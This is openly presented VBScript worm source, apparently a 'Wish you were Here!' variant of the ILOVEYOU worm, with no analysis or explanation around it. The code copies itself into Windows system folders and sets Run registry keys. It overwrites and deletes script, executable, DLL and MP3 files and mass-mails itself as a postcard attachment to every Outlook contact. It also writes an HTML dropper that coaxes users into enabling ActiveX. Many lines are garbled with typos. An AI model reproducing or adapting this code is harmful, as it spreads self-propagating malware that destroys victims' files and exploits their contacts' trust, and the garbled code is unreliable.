On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject ("Scripting.FileSystemObject")
set file = fso.OpenTextFile (WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main ()
sub main ()
On Error Resume Next
dim wscr, rr
set wscr=CreateObject ("WScript.Shell")
rr=wscr.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting 
Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\/software\Microsoft\Windows Scripting 
Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder (0)
Set dirsystem = fso.GetSpecialFolder (1)
Set dirtemp = fso.GetSpecialFolder (2)
Set c = fso.GetFile (WScript.ScriptFullName)
c.Copy (dirsystem&"\MSKernel32.vbs")
c.Copy (dirwin&"\Win32DLL.vbs")
c.Copy (dirsystem&"\Wish you were Here!.postcard.vbs")
regruns ()
html ()
spreadtoemail ()
listadriv ()
end sub
sub regruns ()
On Error Resume Next
Dim num,downread
regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Current 
Version\Run\MSKernel23",dirsystem&"\MSKernel23.vbs"
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32.DLL.vbs"
downread=""
Downread=regget ("HKEY_CURRENT_USER\Software\Microsoft\Internet 
Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
end sub
sub listadriv
On Error Resume Next Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist (d.path&"\")
end if
Next
Listadriv = s
end sub
sub infectfiles (folderspec)
On Error Resume Next
dim f,fl,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder (folderspec)
set fc = f.Files
for each fL in fc
ext=fso.GetExtensionName (fL.path)
ext=lcase (ext)
s=lcase (fl.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile (fl.path,2,true)
ap.write vbscopy
ap.close
elseif (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or 
(ext="sct")or (ext="hta") then
set ap+fso.OpenTextFile (fl.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName (fl.path)
set cop=fso.GetFile (fl.path)
cop.copy (folderspec&"\"&bname&".vbs")
fso.DeleteFIle (fl.path)
elseif (ext="dll") or (ext="exe") then
set dll=fso.OpenTextFile 9fl.path,2,true)
dll.write vbscopy
dll.close
set cop=fso.GetFile (fl.path)
cop.copy(fl.path&".vbs")
fso.DeleteFile(fl.path)
elseif (ext="mp3") or (ext="ini") then
set mp3=fso.OpenTextFile 9fl.path,2,true)
mo3.write vbscopy
mp3.close
set att=fso.GetFile (fl.path)
att.attributes=att.attributes+2
end if
next
end sub
ssub folderlist (folderspec)
On error Resume Next
dim f,fl,sf
set f = fso.GetFolder (folderspec)
set sf = f.SubFolders
for each fl in sf
infectfiles (fl.path)
folderlist(fl.path)
next
end sub
sub regcreate (regkey,regvalue)
Set regedit = CreateObject ("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget (value)
Set regedit = CreateObject ("WScript.shell")
regedit.RegRead (value)
end function
function fileexist (filespec)
On Error Resume NExt
dom msg
if (fso.FileExists (filespec) ) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist (folderspec)
On Error Resume Next
dim msg
if (fso.GetFOlderExists (folderspec) ) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail ()
On Error REsume NExt
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject ("Wscript.Shell")
set out=WScript.CreateObject ("Outlook.Application")
set mapi=out>GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists (ctrlists)
x=1
regv=regedit.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv) ) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries (x)
regad=""
regad=regedit.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad+"") then
set male=out.CreateItem (0)
male.Recipients.Add (malead)
male.Subject = "Wish you were Here!"
male.Body = vbcrlf&"Wish you were Here! Im having a great time!"
male.Attachments.Add(dirsystem&"\Wish you were Here!.postcard.vbs")
male.Send
regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
On Error Resume NExt
dim lines,n,dtal,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dtal="<HTML><HEAD><TITLE>Wish you were Here! - html<?-TITLE>
"<?-?HEAD><BODY
ONMOUSEOUT=@-@window.name=#-#main#-# ; window.open (#-#Wish you were 
Here!.htm#-#,#-#main#-#) @-@ "&vbcrlf&
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open (#-#Wish you were 
Here!.HTM#-#,3-3main#-#) @-@ BGPROPERTIES=@-@fixed@-@ 
BGCOLOR=@-@#FF9933@-@>"&vbcrlf&"<CENTER><P>This HTML file needs ActiveX 
Control<?-?p><P>To Enable to read this HTML file<BR>- Please Press the 
#-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf&"
<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ 
BGCOLOR=@-@yellow@-@>----------z------------------Z------------<?-?MARQUEE>
"&vbcrlf&" <?-?BODY><?-?HTML>"&vbcrlf&"<SCRIPT 
language=@-@JScript@-@>"&vbcrlf&"<!--?-??-?"&vbcrlf&"
if (window.screen) {var wi=screen.availWidth;var 
hi=screen.availHeight;window.moveTo (0,0) ;window.resixeTo (wi,hi) ; 
}"&vbcrlf&"?-??-?-->"&vbcrlf&"
<?-?SCRIPT>"&vbcrlf&"<SCRIPT 
LANGUAGE=@-@VBScript@-@>"&vbcrlf&"<!--"&vbcrlf&"
OnError Resume Next
"&vbcrlf&"
dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf&"
"aw=1"&vbcrlf&"
code="
dta2="set fso=CreateObject (@-@Scripting.FileSystemObject@-@)"&vbcrlf&"
set dirsystem=fso.GetSpecialFolder (1) "&vbcrlf&"
code2=replace (code,chr (91) &chr (45) &chr (91),chr (39) )"&vbcrlf&"
code3=replace (code2,chr (93) &chr (45) &chr (93),chr (34) )"&vbcrlf&"
code4=replace (code3,chr (37) &chr (45) &chr (37),chr (92) )"&vbcrlf&"
set wri=fso.CreateTextFile (dirsystem&@-@^-^MSKernel32.vbs@-@) "&vbcrlf&"
wri.write code4"&vbcrlf&"
wri.close"&vbcrlf&"
if (fso.CreateTextFile (dirsystem&@-@^-^MSKernel32.vbs@-@)) then "&vbcrlf&"
if (err.number=424) then"&vbcrlf&"
aw=0"&vbcrlf&"
end if"&vbcrlf&"
if (aw=1) then"&vbcrlf&"
document.write @-@ERROR: Can#-#t initialize ActiveX@-@"&vbcrlf&"
window.close"&vbcrlf&"
end if"&vbcrlf&"
end if"&vbcrlf&"
Set regedit = CreatObject (@-@WScript.Shell@-@)"&vbcrlf&"
regedit.RegWRite
@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@""&vbcrlf&"?-??-?-->"&vbcrlf&"
</-?SCRIPT>"
dt1=replace (dta1,chr (35) &chr (45) &chr (35),"'")
dt1=replace (dt1,chr (64) &chr (45) &chr (64),"""")
dt4=replace (dt1,chr (63) &chr (45) &chr (63),"/")
dt5=replace (dt4,chr (94) &chr (45) &chr (94),"\")
dt2=replace (dta2,chr (35) &chr (45) &chr (35),"'")
dt2=replace (dt2,chr (64) &chr (45) &chr (64),"""")
dt3=replace (dt2,chr (63) &chr (45) &chr (63),"/")
dt6=replace (dt3,chr (94) &chr (45) &chr (94),"\")
set fso=CreateObject ("Scripting.FileSystemObject")
set c=fso.OpenTextFIle (WScript.ScriptFullName,1)
lines=Split (c.ReadAll,vbclf)
l1=ubound (lines)
for n=0 to bound (lines)
lines(n)=replace (lines (n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace (lines (n),"""",chr (93)+chr(45)+chr(93))
lines(n)=replace (lines (n),"\",chr(37)+chr(45)+chr(37))
if (11=n) then
lines (n)=chr (34)+lines(n)+chr(34)
else
lines (n)=chr (34)+lines(n)+chr(34)"&vbcrlf&"
end if
next
set b=fso.CreatTextFile(dirsystem+"\Wish you were Here!.htm")
b.close
set b=fso.CreatTextFile(dirsystem+"\Wish you were Here!.htm",2)
d.write dt5
d.write join (lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub


